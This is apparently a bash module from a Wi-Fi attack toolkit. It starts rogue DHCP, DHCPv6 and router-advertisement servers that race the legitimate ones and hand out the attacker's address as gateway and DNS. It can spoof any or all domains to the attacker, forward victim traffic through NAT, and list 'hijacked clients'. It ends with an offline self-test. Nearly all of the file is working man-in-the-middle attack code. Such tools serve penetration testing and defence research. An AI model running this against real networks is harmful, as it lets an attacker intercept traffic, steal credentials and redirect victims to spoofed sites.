#!/usr/bin/env bash
# rogue DHCP + DHCPv6/RA — race legit servers, hand out attacker as gw+dns
# ── self-locate WIFISTING_ROOT ──
# When launched via pkexec, HOME is /root and any $HOME-relative path
# would land in the wrong place. Resolve WIFISTING_ROOT from this
# script's own path so state / loot / captures always end up in the
# project tree regardless of who runs us.
if [[ -z "${WIFISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    WIFISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export WIFISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi

# Under pkexec, HOME=/root even though we're writing to the invoking
# user's tree. WIFISTING_ROOT is <real_home>/wifisting, so its parent
# is the real home. Reset HOME so downstream $HOME-relative defaults
# (LOOT_DIR, CAPTURES_DIR, LOGS_DIR, XDG_CONFIG_HOME, etc.) resolve
# to the user's paths instead of /root.
if [[ -n "${WIFISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$WIFISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi

: "${WIFISTING_HOME:=$WIFISTING_ROOT}"

: "${TMP_DIR:=/tmp/wifisting}"
: "${LOOT_DIR:=$HOME/wifisting/loot}"
: "${CAPTURES_DIR:=$HOME/wifisting/captures}"
: "${LOGS_DIR:=$HOME/wifisting/logs}"
: "${WIFISTING_HOME:=$HOME/wifisting}"
: "${WIFISTING_ROOT:=$HOME/wifisting}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" 2>/dev/null

RD_DIR="$TMP_DIR/rogue_dhcp"
RD_CONF="$RD_DIR/dnsmasq.conf"
RD_CONF6="$RD_DIR/dnsmasq6.conf"
RD_RADVD="$RD_DIR/radvd.conf"
RD_LEASES="$RD_DIR/leases"
RD_LOG="$RD_DIR/dnsmasq.log"
RD_LOG6="$RD_DIR/dnsmasq6.log"
RD_RADVD_LOG="$RD_DIR/radvd.log"
RD_PID="$RD_DIR/dnsmasq.pid"
RD_PID6="$RD_DIR/dnsmasq6.pid"
RD_RADVD_PID="$RD_DIR/radvd.pid"
RD_HOSTS="$RD_DIR/hosts.spoof"
RD_STATE="$RD_DIR/state"

rd_prepare() {
    mkdir -p "$RD_DIR"
    [[ -f "$RD_LEASES" ]] || : > "$RD_LEASES"
    [[ -f "$RD_HOSTS"  ]] || : > "$RD_HOSTS"
}

rd_cleanup_trap() {
    # Idempotent — safe to call from trap or from rd_stop.
    rd_stop_all 2>/dev/null || true
}

rd_stop_all() {
    local pid failed=0
    for pf in "$RD_PID" "$RD_PID6" "$RD_RADVD_PID"; do
        [[ -f "$pf" ]] || continue
        pid=$(cat "$pf" 2>/dev/null)
        if [[ -n "$pid" ]]; then
            if stop_kill_pid "$pid"; then
                rm -f "$pf"
            else
                failed=1   # keep the pidfile so the process stays findable
            fi
        else
            rm -f "$pf"
        fi
    done
    stop_sweep "dnsmasq -C $RD_CONF"  || failed=1
    stop_sweep "dnsmasq -C $RD_CONF6" || failed=1
    stop_sweep "radvd -C $RD_RADVD"   || failed=1

    if [[ -f "$RD_DIR/upstream_iface" ]]; then
        local up
        up=$(cat "$RD_DIR/upstream_iface")
        iptables -t nat -D POSTROUTING -o "$up" -j MASQUERADE 2>/dev/null || true
        rm -f "$RD_DIR/upstream_iface"
    fi
    sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1 || true
    sysctl -w net.ipv6.conf.all.forwarding=0 >/dev/null 2>&1 || true
}

rd_pick_iface_interactive() {
    local ifaces=()
    while IFS= read -r i; do
        [[ -n "$i" ]] && ifaces+=("$i")
    done < <(ls /sys/class/net/ | grep -Ev '^(lo|docker|veth|br-|virbr)')

    (( ${#ifaces[@]} == 0 )) && { err "no usable interfaces"; return 1; }

    echo ""
    local n=1
    for i in "${ifaces[@]}"; do
        local ip4 ip6
        ip4=$(ip -4 addr show "$i" 2>/dev/null | awk '/inet /{print $2}' | head -1)
        ip6=$(ip -6 addr show "$i" scope global 2>/dev/null | awk '/inet6 /{print $2}' | head -1)
        printf "  [%d] %-12s v4:%-18s v6:%s\n" "$n" "$i" "${ip4:-none}" "${ip6:-none}"
        n=$((n+1))
    done
    read -rp "  rogue DHCP iface> " sel
    if [[ "$sel" =~ ^[0-9]+$ ]] && (( sel >= 1 && sel <= ${#ifaces[@]} )); then
        RD_IFACE="${ifaces[$((sel-1))]}"
        return 0
    fi
    err "invalid"; return 1
}

rd_derive_defaults() {
    local existing_ip subnet_base
    existing_ip="$(ip -4 addr show "$RD_IFACE" 2>/dev/null | awk '/inet /{print $2}' | head -1)"
    if [[ -n "$existing_ip" ]]; then
        subnet_base="$(echo "$existing_ip" | cut -d. -f1-3)"
        RD_ATTACKER_IP="${RD_ATTACKER_IP:-$(echo "$existing_ip" | cut -d/ -f1)}"
    else
        subnet_base="192.168.1"
        RD_ATTACKER_IP="${RD_ATTACKER_IP:-${subnet_base}.99}"
    fi
    RD_POOL_START="${RD_POOL_START:-${subnet_base}.150}"
    RD_POOL_END="${RD_POOL_END:-${subnet_base}.200}"
    RD_NETMASK="${RD_NETMASK:-255.255.255.0}"
    RD_LEASE="${RD_LEASE:-2m}"
}

rd_write_conf() {
    cat > "$RD_CONF" << EOF
# rogue DHCP + DNS — wifisting
interface=$RD_IFACE
bind-interfaces
except-interface=lo

dhcp-range=$RD_POOL_START,$RD_POOL_END,$RD_NETMASK,$RD_LEASE
dhcp-option=option:router,$RD_ATTACKER_IP
dhcp-option=option:dns-server,$RD_ATTACKER_IP
dhcp-option=option:netmask,$RD_NETMASK
dhcp-authoritative
dhcp-rapid-commit
dhcp-leasefile=$RD_LEASES

no-resolv
no-hosts
addn-hosts=$RD_HOSTS
log-queries
log-dhcp
log-facility=$RD_LOG
dhcp-ignore-names
EOF

    if [[ "$RD_SPOOF_ALL" == "y" ]]; then
        echo "address=/#/$RD_ATTACKER_IP" >> "$RD_CONF"
    elif [[ -n "${RD_SPOOF_DOMAIN:-}" ]]; then
        echo "address=/$RD_SPOOF_DOMAIN/$RD_ATTACKER_IP" >> "$RD_CONF"
    else
        echo "server=1.1.1.1" >> "$RD_CONF"
        echo "server=8.8.8.8" >> "$RD_CONF"
    fi
}

rd_write_conf6() {
    command -v dnsmasq >/dev/null 2>&1 || return 1
    dnsmasq --help 2>&1 | grep -q dhcp-range=.*:: && return 0
    # IPv6 DHCPv6 prefix is derived from attacker's link-local or global
    local v6_prefix="${RD_V6_PREFIX:-}"
    [[ -z "$v6_prefix" ]] && return 1

    cat > "$RD_CONF6" << EOF
# rogue DHCPv6 — wifisting
interface=$RD_IFACE
bind-interfaces
except-interface=lo

dhcp-range=$v6_prefix::100,$v6_prefix::1ff,64,${RD_LEASE:-2m}
dhcp-option=option6:dns-server,[${RD_V6_LL:-::1}]
enable-ra
log-dhcp
log-facility=$RD_LOG6
EOF
}

rd_write_radvd() {
    command -v radvd >/dev/null 2>&1 || return 1
    local v6_prefix="${RD_V6_PREFIX:-}"
    [[ -z "$v6_prefix" ]] && return 1

    cat > "$RD_RADVD" << EOF
interface $RD_IFACE
{
    AdvSendAdvert on;
    MinRtrAdvInterval 3;
    MaxRtrAdvInterval 10;
    AdvManagedFlag on;
    AdvOtherConfigFlag on;
    prefix ${v6_prefix}::/64
    {
        AdvOnLink on;
        AdvAutonomous on;
    };
    RDNSS ${RD_V6_LL:-::1} {};
};
EOF
}

rd_setup_iface() {
    ip link set "$RD_IFACE" up
    if ! ip -4 addr show "$RD_IFACE" | grep -q "$RD_ATTACKER_IP"; then
        ip addr add "$RD_ATTACKER_IP/24" dev "$RD_IFACE" 2>/dev/null || \
            warn "could not add IPv4 (may already be configured)"
    fi
}

rd_setup_forwarding() {
    read -rp "  enable NAT/forwarding so victims still reach internet? [Y/n]> " nat
    if [[ "${nat,,}" != "n" ]]; then
        sysctl -w net.ipv4.ip_forward=1 >/dev/null
        sysctl -w net.ipv6.conf.all.forwarding=1 >/dev/null 2>&1

        local up
        up="$(ip route | awk '/^default/{print $5}' | grep -v "^$RD_IFACE$" | head -1)"
        if [[ -n "$up" ]]; then
            iptables -t nat -C POSTROUTING -o "$up" -j MASQUERADE 2>/dev/null || \
                iptables -t nat -A POSTROUTING -o "$up" -j MASQUERADE
            echo "$up" > "$RD_DIR/upstream_iface"
            ok "NAT via $up enabled"
        else
            warn "no upstream iface found — victims won't have internet"
        fi
    fi
}

rd_save_state() {
    cat > "$RD_STATE" << EOF
IFACE=$RD_IFACE
ATTACKER_IP=$RD_ATTACKER_IP
POOL_START=$RD_POOL_START
POOL_END=$RD_POOL_END
NETMASK=$RD_NETMASK
LEASE=$RD_LEASE
EOF
}

rd_load_state() {
    [[ -f "$RD_STATE" ]] || return 1
    # shellcheck source=/dev/null
    source "$RD_STATE"
    [[ -n "${IFACE:-}" ]] && export RD_IFACE="$IFACE"
    [[ -n "${ATTACKER_IP:-}" ]] && export RD_ATTACKER_IP="$ATTACKER_IP"
    [[ -n "${POOL_START:-}" ]] && export RD_POOL_START="$POOL_START"
    [[ -n "${POOL_END:-}" ]] && export RD_POOL_END="$POOL_END"
    [[ -n "${NETMASK:-}" ]] && export RD_NETMASK="$NETMASK"
    [[ -n "${LEASE:-}" ]] && export RD_LEASE="$LEASE"
}

# ── CLI: status / start / stop / leases / log ──

rd_cli_status_tsv() {
    local running=0 pid=""
    if [[ -f "$RD_PID" ]]; then
        pid=$(cat "$RD_PID")
        kill -0 "$pid" 2>/dev/null && running=1
    fi
    local running6=0 pid6=""
    if [[ -f "$RD_PID6" ]]; then
        pid6=$(cat "$RD_PID6")
        kill -0 "$pid6" 2>/dev/null && running6=1
    fi
    local running_ra=0 pid_ra=""
    if [[ -f "$RD_RADVD_PID" ]]; then
        pid_ra=$(cat "$RD_RADVD_PID")
        kill -0 "$pid_ra" 2>/dev/null && running_ra=1
    fi

    local leases=0
    [[ -s "$RD_LEASES" ]] && leases=$(wc -l < "$RD_LEASES")

    printf 'running\t%s\n'      "$running"
    printf 'pid\t%s\n'          "$pid"
    printf 'running6\t%s\n'     "$running6"
    printf 'pid6\t%s\n'         "$pid6"
    printf 'running_ra\t%s\n'   "$running_ra"
    printf 'pid_ra\t%s\n'       "$pid_ra"
    printf 'iface\t%s\n'        "${RD_IFACE:-}"
    printf 'attacker_ip\t%s\n'  "${RD_ATTACKER_IP:-}"
    printf 'pool\t%s\n'         "${RD_POOL_START:-}-${RD_POOL_END:-}"
    printf 'leases\t%s\n'       "$leases"
    printf 'log\t%s\n'          "$RD_LOG"
    printf 'loot\t%s\n'         "$RD_DIR"
}

rd_cli_list_ifaces_tsv() {
    local name ip4 ip6
    while IFS= read -r name; do
        [[ -z "$name" ]] && continue
        ip4=$(ip -4 addr show "$name" 2>/dev/null | awk '/inet /{print $2}' | head -1)
        ip6=$(ip -6 addr show "$name" scope global 2>/dev/null | awk '/inet6 /{print $2}' | head -1)
        printf '%s\t%s\t%s\n' "$name" "${ip4:-}" "${ip6:-}"
    done < <(ls /sys/class/net/ | grep -Ev '^(lo|docker|veth|br-|virbr)')
}

rd_cli_start() {
    # args: IFACE ATTACKER_IP POOL_START POOL_END [NETMASK] [LEASE] [V6_PREFIX]
    local iface="$1" attacker="$2" pool_start="$3" pool_end="$4"
    local netmask="${5:-255.255.255.0}"
    local lease="${6:-2m}"
    local v6_prefix="${7:-}"

    [[ -z "$iface" || -z "$attacker" || -z "$pool_start" || -z "$pool_end" ]] && {
        printf 'ERROR\tusage: --start IFACE ATTACKER_IP POOL_START POOL_END [NETMASK] [LEASE] [V6_PREFIX]\n'
        return 2
    }
    command -v dnsmasq >/dev/null 2>&1 || { printf 'ERROR\tdnsmasq missing\n'; return 1; }
    [[ -e "/sys/class/net/$iface" ]] || { printf 'ERROR\tno such iface: %s\n' "$iface"; return 1; }

    # Stop any previous instance
    rd_stop_all 2>/dev/null || true

    RD_IFACE="$iface"
    RD_ATTACKER_IP="$attacker"
    RD_POOL_START="$pool_start"
    RD_POOL_END="$pool_end"
    RD_NETMASK="$netmask"
    RD_LEASE="$lease"
    RD_V6_PREFIX="$v6_prefix"
    RD_SPOOF_ALL="${RD_SPOOF_ALL:-n}"
    RD_SPOOF_DOMAIN="${RD_SPOOF_DOMAIN:-}"

    export RD_IFACE RD_ATTACKER_IP RD_POOL_START RD_POOL_END
    export RD_NETMASK RD_LEASE RD_SPOOF_ALL RD_SPOOF_DOMAIN

    rd_prepare
    rd_write_conf
    rd_setup_iface
    rd_setup_forwarding
    rd_save_state

    trap 'rd_cleanup_trap' INT TERM EXIT

    dnsmasq -C "$RD_CONF" -x "$RD_PID" --log-async=25 \
        > "$RD_LOG.stdout" 2>&1 &
    local main_pid=$!
    echo "$main_pid" > "$RD_PID"
    sleep 1

    if ! kill -0 "$main_pid" 2>/dev/null; then
        printf 'ERROR\tdnsmasq failed — check %s\n' "$RD_LOG"
        return 1
    fi

    # DHCPv6 + RA
    if [[ -n "$v6_prefix" ]]; then
        if rd_write_conf6; then
            dnsmasq -C "$RD_CONF6" -x "$RD_PID6" --log-async=25 \
                > "$RD_LOG6.stdout" 2>&1 &
            echo $! > "$RD_PID6"
            sleep 0.5
        fi
        if rd_write_radvd; then
            radvd -C "$RD_RADVD" -p "$RD_RADVD_PID" \
                > "$RD_RADVD_LOG" 2>&1 &
            echo $! > "$RD_RADVD_PID"
            sleep 0.5
        fi
    fi

    printf 'STARTED\t%s\n' "$main_pid"
    printf 'IFACE\t%s\n'   "$iface"
    printf 'GW\t%s\n'      "$attacker"
    printf 'POOL\t%s-%s\n' "$pool_start" "$pool_end"
    printf 'LOG\t%s\n'     "$RD_LOG"
}

rd_cli_stop() {
    local was_running=0
    if [[ -f "$RD_PID" ]] && kill -0 "$(cat "$RD_PID")" 2>/dev/null; then
        was_running=1
    fi
    rd_stop_all
    trap - INT TERM EXIT
    # Report whether anything is STILL alive, not merely whether something
    # was alive before we tried — the old form claimed success unconditionally.
    local still=0
    for pf in "$RD_PID" "$RD_PID6" "$RD_RADVD_PID"; do
        [[ -f "$pf" ]] && still=1
    done
    if (( still == 0 )); then
        printf 'STOPPED\t%s\n' "$was_running"
        return 0
    fi
    printf 'ERROR\trogue DHCP processes survived SIGKILL (pidfiles kept)\n' >&2
    return 1
}

rd_cli_leases_tsv() {
    [[ ! -s "$RD_LEASES" ]] && return 0
    while read -r ts mac ip host clientid; do
        [[ -z "$mac" ]] && continue
        printf '%s\t%s\t%s\t%s\t%s\n' \
            "${ts:-?}" "$mac" "${ip:-?}" "${host:-}" "${clientid:-}"
    done < "$RD_LEASES"
}

rd_cli_log_path() {
    printf '%s\n' "$RD_LOG"
}

rd_cli_tail_log() {
    local lines="${1:-100}"
    [[ -f "$RD_LOG" ]] && tail -n "$lines" "$RD_LOG"
}

# ── interactive menu (kept for CLI usage) ──

rd_leases() {
    if [[ -s "$RD_LEASES" ]]; then
        echo ""
        echo "  === hijacked clients (rogue DHCP leases) ==="
        printf "  %-12s %-18s %-16s %s\n" "EXPIRES" "MAC" "IP" "HOSTNAME"
        while read -r ts mac ip host _; do
            printf "  %-12s %-18s %-16s %s\n" "$ts" "$mac" "$ip" "${host:--}"
        done < "$RD_LEASES"
    else
        warn "no leases handed out yet"
    fi
    read -rp "  press enter " _
}

rogue_dhcp_menu() {
    while true; do
        banner 2>/dev/null || clear
        echo -e "  === rogue DHCP / DHCPv6 / RA ==="
        rd_cli_status_tsv | awk -F'\t' '{printf "  %-14s %s\n",$1":",$2}'
        cat << 'M'

  [1]  start rogue DHCP (interactive)
  [2]  stop all
  [3]  show leases
  [4]  tail log
  [5]  edit hosts.spoof
  [0]  back

M
        read -rp "  choice> " c
        case "$c" in
            1)
                rd_pick_iface_interactive || { sleep 1; continue; }
                rd_derive_defaults
                read -rp "  attacker IP [$RD_ATTACKER_IP]> " tmp; RD_ATTACKER_IP="${tmp:-$RD_ATTACKER_IP}"
                read -rp "  pool start [$RD_POOL_START]> " tmp; RD_POOL_START="${tmp:-$RD_POOL_START}"
                read -rp "  pool end [$RD_POOL_END]> " tmp; RD_POOL_END="${tmp:-$RD_POOL_END}"
                read -rp "  v6 prefix (blank = skip IPv6)> " v6
                rd_cli_start "$RD_IFACE" "$RD_ATTACKER_IP" "$RD_POOL_START" "$RD_POOL_END" \
                    "$RD_NETMASK" "$RD_LEASE" "$v6"
                read -rp "  press enter " _
                ;;
            2) rd_cli_stop; read -rp "  press enter " _ ;;
            3) rd_leases ;;
            4) rd_cli_tail_log 200 ;;
            5) ${EDITOR:-nano} "$RD_HOSTS" ;;
            0) return ;;
            *) warn "invalid"; sleep 0.5 ;;
        esac
    done
}

# ── dispatch ──

# ── verified stop ──
# Escalating signals; returns 0 ONLY once the pid is actually gone. Signals
# the process group first so forked children die with the leader. Stops that
# print STOPPED and delete the pidfile without this can strand a capture with
# no remaining handle to it, making the stop button useless.
stop_kill_pid() {
    local pid="$1" i
    # Liveness via /proc, NOT `kill -0`: for a root-owned process we get EPERM,
    # and treating that as "gone" made stops report success while nothing died.
    [[ -d "/proc/$pid" ]] || return 0
    kill -INT  "-$pid" 2>/dev/null || kill -INT  "$pid" 2>/dev/null
    for i in 1 2 3 4 5 6 7 8 9 10; do
        [[ -d "/proc/$pid" ]] || return 0
        sleep 0.2
    done
    kill -TERM "-$pid" 2>/dev/null || kill -TERM "$pid" 2>/dev/null
    for i in 1 2 3 4 5; do
        [[ -d "/proc/$pid" ]] || return 0
        sleep 0.2
    done
    kill -KILL "-$pid" 2>/dev/null || kill -KILL "$pid" 2>/dev/null
    sleep 0.3
    [[ -d "/proc/$pid" ]] && return 1
    return 0
}
# Kill everything matching a pgrep -f pattern, never this shell or its parent.
# Returns non-zero only if something matched and SURVIVED.
stop_sweep() {
    local pat="$1" sp rs=0 any=0
    # Exclude this process AND its whole ancestor chain. Excluding only $$ and
    # $PPID is not enough: when invoked via `timeout` or pkexec the caller's
    # shell is further up, and a cmdline substring match would kill it — a
    # pattern like "mitm6" matches the very command line running this stop.
    local -A _skip=()
    sp=$$
    while [[ -n "$sp" && "$sp" != "0" && "$sp" != "1" ]]; do
        _skip[$sp]=1
        sp=$(ps -o ppid= -p "$sp" 2>/dev/null | tr -d ' ')
        [[ -z "$sp" ]] && break
    done
    for sp in $(pgrep -f "$pat" 2>/dev/null); do
        [[ -n "${_skip[$sp]:-}" ]] && continue
        any=1
        stop_kill_pid "$sp" || rs=1
    done
    (( any )) && return $rs
    return 0
}

# ── self-test ────────────────────────────────────────────────────────────
# Offline only: no root, no dnsmasq, no radvd, no iface configuration. Every
# path this writes (conf, leases, state, log) is redirected under $TMP_DIR.
rd_selftest() {
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$((bad+1)); fi
    }
    rfld() { awk -F'\t' -v k="$1" '$1==k {print $2; exit}'; }

    local MOD_TMP="$TMP_DIR/rogue_dhcp_selftest"
    rm -rf "$MOD_TMP"; mkdir -p "$MOD_TMP"
    local save_dir="$RD_DIR"
    RD_DIR="$MOD_TMP"
    RD_CONF="$RD_DIR/dnsmasq.conf"; RD_CONF6="$RD_DIR/dnsmasq6.conf"
    RD_RADVD="$RD_DIR/radvd.conf";  RD_LEASES="$RD_DIR/leases"
    RD_LOG="$RD_DIR/dnsmasq.log";   RD_LOG6="$RD_DIR/dnsmasq6.log"
    RD_RADVD_LOG="$RD_DIR/radvd.log"
    RD_PID="$RD_DIR/dnsmasq.pid";   RD_PID6="$RD_DIR/dnsmasq6.pid"
    RD_RADVD_PID="$RD_DIR/radvd.pid"
    RD_HOSTS="$RD_DIR/hosts.spoof"; RD_STATE="$RD_DIR/state"

    # ── dnsmasq config generation: the three DNS-answer branches ──
    RD_IFACE="eth0"
    RD_ATTACKER_IP="192.168.1.99"
    RD_POOL_START="192.168.1.150"
    RD_POOL_END="192.168.1.200"
    RD_NETMASK="255.255.255.0"
    RD_LEASE="2m"
    RD_SPOOF_ALL="n"
    RD_SPOOF_DOMAIN=""

    rd_write_conf
    chk conf-rc "$?" "0"
    chk conf-range "$(grep -cF 'dhcp-range=192.168.1.150,192.168.1.200,255.255.255.0,2m' "$RD_CONF")" "1"
    chk conf-router "$(grep -cF 'dhcp-option=option:router,192.168.1.99' "$RD_CONF")" "1"
    chk conf-dns-server "$(grep -cF 'dhcp-option=option:dns-server,192.168.1.99' "$RD_CONF")" "1"
    chk conf-leasefile "$(grep -cF "dhcp-leasefile=$RD_LEASES" "$RD_CONF")" "1"
    chk conf-interface "$(grep -cF 'interface=eth0' "$RD_CONF")" "1"
    # No spoof configured: upstream resolvers, and no address= override.
    chk conf-upstream "$(grep -cF 'server=1.1.1.1' "$RD_CONF")" "1"
    chk conf-upstream2 "$(grep -cF 'server=8.8.8.8' "$RD_CONF")" "1"
    chk conf-no-spoof "$(grep -c '^address=' "$RD_CONF")" "0"

    # Single-domain spoof replaces the upstream resolvers.
    RD_SPOOF_DOMAIN="example.com"
    rd_write_conf
    chk conf-domain-spoof "$(grep -cF 'address=/example.com/192.168.1.99' "$RD_CONF")" "1"
    chk conf-domain-no-upstream "$(grep -c '^server=' "$RD_CONF")" "0"

    # Spoof-all wins over the domain, and uses the # wildcard.
    RD_SPOOF_ALL="y"
    rd_write_conf
    chk conf-spoof-all "$(grep -cF 'address=/#/192.168.1.99' "$RD_CONF")" "1"
    chk conf-spoof-all-no-domain "$(grep -c '^address=/example' "$RD_CONF")" "0"
    RD_SPOOF_ALL="n"; RD_SPOOF_DOMAIN=""

    # ── lease file parsing ──
    rd_prepare
    chk prepare-rc "$?" "0"
    printf '%s\n' \
      '1700000000 aa:bb:cc:dd:ee:01 192.168.1.150 android-1 01:aa:bb:cc:dd:ee:01' \
      '1700000001 aa:bb:cc:dd:ee:02 192.168.1.151 * *' > "$RD_LEASES"
    local lt
    lt=$(rd_cli_leases_tsv)
    chk leases-rows "$(grep -c . <<<"$lt")" "2"
    chk leases-row1 "$(sed -n 1p <<<"$lt")" \
        "$(printf '1700000000\taa:bb:cc:dd:ee:01\t192.168.1.150\tandroid-1\t01:aa:bb:cc:dd:ee:01')"
    chk leases-row2 "$(sed -n 2p <<<"$lt")" \
        "$(printf '1700000001\taa:bb:cc:dd:ee:02\t192.168.1.151\t*\t*')"
    # A line without a lease body must be skipped, not turned into a row.
    printf 'garbage\n' > "$RD_LEASES"
    chk leases-malformed-skipped "$(rd_cli_leases_tsv | grep -c .)" "0"
    # An empty lease file is not an error, it is simply empty.
    : > "$RD_LEASES"
    local rc=0
    rd_cli_leases_tsv >/dev/null || rc=$?
    chk leases-empty-rc "$rc" "0"

    # ── state save / load round trip ──
    printf '%s\n' \
      '1700000000 aa:bb:cc:dd:ee:01 192.168.1.150 android-1 01:aa:bb:cc:dd:ee:01' \
      '1700000001 aa:bb:cc:dd:ee:02 192.168.1.151 * *' > "$RD_LEASES"
    RD_IFACE="wlan0"
    RD_ATTACKER_IP="10.0.0.99"
    RD_POOL_START="10.0.0.150"
    RD_POOL_END="10.0.0.200"
    RD_NETMASK="255.255.255.0"
    RD_LEASE="5m"
    rd_save_state
    chk state-rc "$?" "0"
    chk state-iface "$(awk -F= '$1=="IFACE"{print $2}' "$RD_STATE")" "wlan0"
    chk state-line-count "$(grep -c . "$RD_STATE")" "6"

    unset RD_IFACE RD_ATTACKER_IP RD_POOL_START RD_POOL_END RD_NETMASK RD_LEASE
    rd_load_state
    chk load-state-rc "$?" "0"
    chk load-iface "$RD_IFACE" "wlan0"
    chk load-attacker "$RD_ATTACKER_IP" "10.0.0.99"
    chk load-pool-start "$RD_POOL_START" "10.0.0.150"
    chk load-pool-end "$RD_POOL_END" "10.0.0.200"
    chk load-netmask "$RD_NETMASK" "255.255.255.0"
    chk load-lease "$RD_LEASE" "5m"

    rm -f "$RD_STATE"
    rc=0; rd_load_state >/dev/null 2>&1 || rc=$?
    chk load-state-missing-rc "$rc" "1"

    # ── default derivation with no address on the iface ──
    unset RD_ATTACKER_IP RD_POOL_START RD_POOL_END RD_NETMASK RD_LEASE
    RD_IFACE="wf-selftest-nonexistent"
    rd_derive_defaults
    chk derive-rc "$?" "0"
    chk derive-attacker "$RD_ATTACKER_IP" "192.168.1.99"
    chk derive-pool "$RD_POOL_START-$RD_POOL_END" "192.168.1.150-192.168.1.200"
    chk derive-netmask "$RD_NETMASK" "255.255.255.0"
    chk derive-lease "$RD_LEASE" "2m"
    # An explicit value must survive derivation.
    RD_ATTACKER_IP="172.16.0.9"
    rd_derive_defaults
    chk derive-explicit-wins "$RD_ATTACKER_IP" "172.16.0.9"

    # ── log helpers ──
    printf '%s\n' 'l1' 'l2' 'l3' > "$RD_LOG"
    chk log-path "$(rd_cli_log_path)" "$RD_LOG"
    chk tail-log-2 "$(rd_cli_tail_log 2)" "$(printf 'l2\nl3')"
    rm -f "$RD_LOG"
    chk tail-log-missing-silent "$(rd_cli_tail_log 2 | grep -c .)" "0"

    # ── status TSV contract ──
    RD_IFACE="wlan0"; RD_ATTACKER_IP="10.0.0.99"
    RD_POOL_START="10.0.0.150"; RD_POOL_END="10.0.0.200"
    local st
    st=$(rd_cli_status_tsv)
    chk status-tsv-rows "$(grep -c . <<<"$st")" "12"
    chk status-tsv-log "$(rfld log <<<"$st")" "$RD_LOG"
    chk status-tsv-loot "$(rfld loot <<<"$st")" "$RD_DIR"
    chk status-tsv-pool "$(rfld pool <<<"$st")" "10.0.0.150-10.0.0.200"
    chk status-tsv-leases "$(rfld leases <<<"$st")" "2"
    chk status-tsv-not-running "$(rfld running <<<"$st")" "0"

    # ── verified stop ──
    chk stop-kill-missing-pid "$(stop_kill_pid 999999; echo $?)" "0"
    chk stop-sweep-no-match "$(stop_sweep 'wf-selftest-no-such-process'; echo $?)" "0"

    rc=0; rd_cli_main --no-such-flag >/dev/null 2>&1 || rc=$?
    chk unknown-command-rc "$rc" "2"

    RD_DIR="$save_dir"
    rm -rf "$MOD_TMP"

    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

rd_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)        rd_cli_status_tsv ;;
        --list-ifaces-tsv)   rd_cli_list_ifaces_tsv ;;
        --start)             rd_cli_start "$@" ;;
        --stop)              rd_cli_stop ;;
        --leases-tsv)        rd_cli_leases_tsv ;;
        --log-path)          rd_cli_log_path ;;
        --tail-log)          rd_cli_tail_log "$@" ;;
        --selftest)          rd_selftest ;;
        *)
            cat >&2 <<EOF
Usage: $0 COMMAND
  --status-tsv
  --list-ifaces-tsv
  --start IFACE ATTACKER_IP POOL_START POOL_END [NETMASK] [LEASE] [V6_PREFIX]
  --stop
  --leases-tsv
  --log-path
  --tail-log [LINES]
  --selftest                  offline assertions, no hardware
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    WIFISTING_CLI=1
    command -v banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    command -v warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    command -v err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    command -v ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    rd_cli_main "$@"
fi
